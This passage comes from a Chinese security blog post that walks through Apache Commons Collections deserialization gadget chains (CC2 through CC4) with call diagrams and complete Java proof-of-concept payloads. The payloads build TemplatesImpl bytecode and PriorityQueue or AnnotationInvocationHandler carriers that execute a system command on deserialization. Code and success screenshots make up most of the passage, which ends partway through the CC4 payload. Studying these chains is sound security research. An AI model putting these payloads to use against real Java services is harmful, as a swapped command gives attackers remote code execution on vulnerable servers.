<p>因此需要在反射中构造 <code>queue</code> 和 <code>size</code> 的属性值，当然通过 <code>add</code> 方法加两个值也可以，不过由于 <code>add</code> 方法会由 <code>add()</code>-&gt;<code>offer()</code>-&gt;<code>siftUp()</code>-&gt;<code>siftUp()</code>-&gt;<code>siftUpUsingComparator()</code>-&gt;<code>comparator.compare()</code> 最终在本地执行 <code>payload</code> ，需要在进行 <code>add</code> 方法调用后再通过反射给 <code>comparator</code> 属性赋值，这里就直接用反射设置 <code>size</code> 的值了👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        CtClass[] cs = <span class="keyword">new</span> CtClass[]&#123;</span><br><span class="line">                pool.makeClass(<span class="string">&quot;a&quot;</span> + System.nanoTime()),</span><br><span class="line">                pool.makeClass(<span class="string">&quot;b&quot;</span> + System.nanoTime())</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        cs[<span class="number">0</span>].makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] bc = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                cs[<span class="number">0</span>].toBytecode(),</span><br><span class="line">                cs[<span class="number">1</span>].toBytecode()</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化templates并通过反射赋值</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bc);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;dqv5&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造TransformingComparator</span></span><br><span class="line">        InvokerTransformer itf = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator tc = <span class="keyword">new</span> TransformingComparator(itf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造PriorityQueue</span></span><br><span class="line">        PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, tc);</span><br><span class="line"></span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>), <span class="keyword">null</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化测试</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(pq);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150954323.png" alt="image-20220215095421119"></p>
<p>是成功了。</p>
<h3 id="CC3"><a href="#CC3" class="headerlink" title="- CC3 -"></a>- CC3 -</h3><p>实验环境：</p>
<ul>
<li><code>jdk1.7.0_02</code></li>
<li><code>commons.collections 3.2.0</code></li>
</ul>
<h4 id="调用结构-2"><a href="#调用结构-2" class="headerlink" title="- 调用结构 -"></a>- 调用结构 -</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">	👇</span><br><span class="line">	(Map)Proxy.entrySet()</span><br><span class="line">	👇</span><br><span class="line">	(Map)Proxy.invoke() &lt;=&gt; AnnotationInvocationHandler.invoke()</span><br><span class="line">		👇</span><br><span class="line">		LazyMap.get()</span><br><span class="line">		👇</span><br><span class="line">		ChainedTransformer.transform()</span><br><span class="line">		👇</span><br><span class="line">		ConstantTransformer.transform() =&gt; InstantiateTransformer</span><br><span class="line">        👇</span><br><span class="line">        InstantiateTransformer.transform() =&gt; TrAXFilter.TrAXFilter()</span><br><span class="line">        	👇</span><br><span class="line">        	TrAXFilter.TrAXFilter()</span><br><span class="line">        	👇</span><br><span class="line">			TemplatesImpl.newTransformer()</span><br><span class="line">            👇</span><br><span class="line">            TemplatesImpl.getTransletInstance()</span><br><span class="line">            👇</span><br><span class="line">            TemplatesImpl.defineTransletClasses()</span><br><span class="line">            👇</span><br><span class="line">            newInstance()</span><br><span class="line">        </span><br></pre></td></tr></table></figure>
<h4 id="分析-4"><a href="#分析-4" class="headerlink" title="- 分析 -"></a>- 分析 -</h4><p>可以看到后半段为 <code>TemplatesImpl</code> 的 <code>payload</code> ，前半段和 <code>CC1</code> 链条的前半段相似，主要区别是中段多出了对 <code>InstantiateTransformer</code>  类的 <code>transform</code> 方法调用和由 <code>TrAXFilter</code> 类的构造方法到达 <code>TemplatesImpl</code> 类的 <code>newTransformer</code> 方法。</p>
<p>先来看 <code>InstantiateTransformer</code> 类的 <code>transform</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151043797.png" alt="image-20220215104326719"></p>
<p>可以用来将一个拥有公有构造方法的类实例化，传入的参数是可控且可序列化的👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151045763.png" alt="image-20220215104527715"></p>
<p>再来到 <code>TrAXFilter</code> 类的构造方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151047868.png" alt="image-20220215104703802"></p>
<p>在这里将传入的 <code>templates</code> 参数类型为 <code>Templates</code> 接口，然后调用了 <code>templates</code> 参数的 <code>newTransformer</code> 方法；而 <code>TemplatesImpl</code> 这个 <code>payload</code> 的关键正好是需要对其 <code>newTransformer</code> 方法的调用，并且 <code>TemplatesImpl</code> 类也是实现了 <code>Templates</code> 接口的。</p>
<p>因此就可以通过这个 <code>[(Templates)可控].newTransformer()</code> 的调用达成 <code>TemplatesImpl</code> 的 <code>payload</code> 了。</p>
<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="- payload -"></a>- payload -</h4><p>由于这条链前半段和 <code>CC1</code> 链的前半段相似，就不做分析，中段只需要将对 <code>InstantiateTransformer</code> 类的 <code>tranform</code> 方法调用的参数设为 <code>TrAXFilter</code> 类、并将 <code>InstantiateTransformer</code> 类的 <code>iParamTypes</code> 和 <code>iArgs</code> 属性构造好，接上 <code>TrAXFilter</code> 类构造方法的参数类型以及 <code>TemplatesImpl</code> 类的 <code>payload</code> 即可👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Documented;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test3</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ChainedTransformer <span class="title">getTransformerChain</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        CtClass[] cs = <span class="keyword">new</span> CtClass[]&#123;</span><br><span class="line">                pool.makeClass(<span class="string">&quot;a&quot;</span> + System.nanoTime()),</span><br><span class="line">                pool.makeClass(<span class="string">&quot;b&quot;</span> + System.nanoTime())</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        cs[<span class="number">0</span>].makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] bc = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                cs[<span class="number">0</span>].toBytecode(),</span><br><span class="line">                cs[<span class="number">1</span>].toBytecode()</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化templates并通过反射赋值</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bc);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;dqv5&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class aih = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor aihC = aih.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihC.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成有关Transformer的payload</span></span><br><span class="line">        Map map = LazyMap.decorate(<span class="keyword">new</span> HashMap(), getTransformerChain());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第一个AnnotationInvocationHandler作为代理</span></span><br><span class="line">        InvocationHandler aihC1 = (InvocationHandler) aihC.newInstance(Documented.class, map);</span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(aih.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, aihC1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二个AnnotationInvocationHandler作为载体</span></span><br><span class="line">        Object aihC2 = aihC.newInstance(Documented.class, proxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化测试</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(aihC2);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151109997.png" alt="image-20220215110939809"></p>
<p>是成功了。</p>
<h3 id="CC4"><a href="#CC4" class="headerlink" title="- CC4 -"></a>- CC4 -</h3><p>实验环境：</p>
<ul>
<li><code>jdk1.7.0_02</code></li>
<li><code>Commons Collections 4.0</code></li>
</ul>
<h4 id="调用结构-3"><a href="#调用结构-3" class="headerlink" title="- 调用结构 -"></a>- 调用结构 -</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">	👇</span><br><span class="line">	PriorityQueue.heapify()</span><br><span class="line">	👇</span><br><span class="line">	PriorityQueue.siftDown()</span><br><span class="line">    👇</span><br><span class="line">    PriorityQueue.siftDownUsingComparator()</span><br><span class="line">		👇</span><br><span class="line">		TransformingComparator.compare()</span><br><span class="line">			👇</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">			👇</span><br><span class="line">			ConstantTransformer.transform() =&gt; InstantiateTransformer</span><br><span class="line">        	👇</span><br><span class="line">        	InstantiateTransformer.transform() =&gt; TrAXFilter.TrAXFilter()</span><br><span class="line">            👇</span><br><span class="line">        	TrAXFilter.TrAXFilter()</span><br><span class="line">        	👇</span><br><span class="line">			TemplatesImpl.newTransformer()</span><br><span class="line">            👇</span><br><span class="line">            TemplatesImpl.getTransletInstance()</span><br><span class="line">            👇</span><br><span class="line">            TemplatesImpl.defineTransletClasses()</span><br><span class="line">            👇</span><br><span class="line">            newInstance()</span><br><span class="line">            </span><br></pre></td></tr></table></figure>
<h4 id="分析-5"><a href="#分析-5" class="headerlink" title="- 分析 -"></a>- 分析 -</h4><p>怎么说呢，就是将 <code>CC2</code> 前半段和 <code>CC3</code> 中段加起来，再接上 <code>TemplatesImpl</code> 的 <code>payload</code> 。</p>
<h4 id="payload-5"><a href="#payload-5" class="headerlink" title="- payload -"></a>- payload -</h4><p>拼接一下就好了👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test4</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ChainedTransformer <span class="title">getTransformerChain</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        CtClass[] cs = <span class="keyword">new</span> CtClass[]&#123;</span><br><span class="line">                pool.makeClass(<span class="string">&quot;a&quot;</span> + System.nanoTime()),</span><br><span class="line">                pool.makeClass(<span class="string">&quot;b&quot;</span> + System.nanoTime())</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        cs[<span class="number">0</span>].makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] bc = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                cs[<span class="number">0</span>].toBytecode(),</span><br><span class="line">                cs[<span class="number">1</span>].toBytecode()</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化templates并通过反射赋值</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bc);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;dqv5&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> 